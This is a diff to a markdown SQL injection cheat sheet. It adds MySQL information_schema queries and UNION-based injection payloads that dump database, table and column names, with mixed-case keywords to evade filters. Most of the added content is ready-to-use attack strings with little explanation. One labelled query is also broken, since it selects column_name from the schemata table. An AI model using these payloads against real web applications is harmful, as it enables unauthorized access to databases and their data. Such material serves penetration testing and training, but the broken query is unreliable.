@@ -32,11 +32,33 @@ Es importante tener en cuenta que la disponibilidad y el contenido exacto de la 
 
 ## 💀 Basics: `information schema`
 
-### 💉 Query basic
+### 💉 SQL Query: Basic schema info
 
 ````sql
 ## Schema Name AKA Databases Names Dump
 SELECT schema_name FROM information_schema.schemata;
+
+## Table Name AKA Tables Names Dump
+SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+SELECT table_name FROM information_schema.tables WHERE table_schema='fz3r0_videogame_extravaganza';
+
+## Schema Name AKA Databases Names Dump
+SELECT column_name FROM information_schema.schemata;
+````
+
+---
+
+### 💉 Injection: Extract `Database Names`, `Tables of a Database`, `Column Names`
+
+````sql
+## Database Names
+-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
+
+## Tables of a Database
+-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[$database]
+
+## Column Names
+-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[$table name]
 ````
 
 ---
